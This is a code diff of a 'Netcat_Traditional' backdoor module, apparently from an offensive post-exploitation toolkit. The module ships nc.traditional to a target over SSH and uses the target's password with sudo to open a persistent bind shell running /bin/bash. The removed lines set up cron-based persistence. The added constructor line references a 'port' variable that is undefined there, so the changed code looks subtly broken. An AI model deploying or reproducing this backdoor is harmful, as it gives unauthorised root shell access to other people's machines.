@@ -11,10 +11,10 @@ class Netcat_Traditional(Backdoor):
         self.options = {
                 "port"   : Option("port", 53926, "port to connect to", True),
                 }
-    
-    def check_valid(self):
-        return True
-    
+        self.command = "echo " + self.target.pword + " | sudo -S nohup ./nc.traditional -l -p %s -e /bin/bash" % port
+        self.enabled_modules = {}
+        self.modules = {} 
+        
     def get_value(self, name):
         if name in self.options:
             return self.options[name].value
@@ -23,17 +23,10 @@ class Netcat_Traditional(Backdoor):
 
 
     def do_exploit(self, args):
-        cron = (raw_input(" + Press y to start backdoor as a cronjob (recommended): ") == 'y')
-	port = self.get_value("port")
+        port = self.get_value("port")
         print(INFO + "Shipping netcat-traditional package.")
-	self.target.scpFiles(self, '/bin/nc.traditional', False)
-	print(GOOD + "Initializing backdoor on port %s..." % port)
-	if cron:
-	    self.target.ssh.exec_command("crontab -l > mycron")
-	    str = ("* * * * * echo \\\""+ self.target.pword + "\\\" | sudo -S nohup ./nc.traditional -l -p %s -e /bin/bash" % port)
-	    #print ("echo \"" + str + "\" >> mycron && crontab mycron && rm mycron")
-	    self.target.ssh.exec_command("echo \"" + str + "\" >> mycron && crontab mycron && rm mycron")
-	else:
-            self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S nohup ./nc.traditional -l -p %s -e /bin/bash" % port)
+        self.target.scpFiles(self, '/bin/nc.traditional', False)
+        print(GOOD + "Initializing backdoor on port %s..." % port)
+        self.target.ssh.exec_command(self.command)
         print(GOOD + "Backdoor attempted. Use nc " + self.target.hostname + " %s." % port)
 
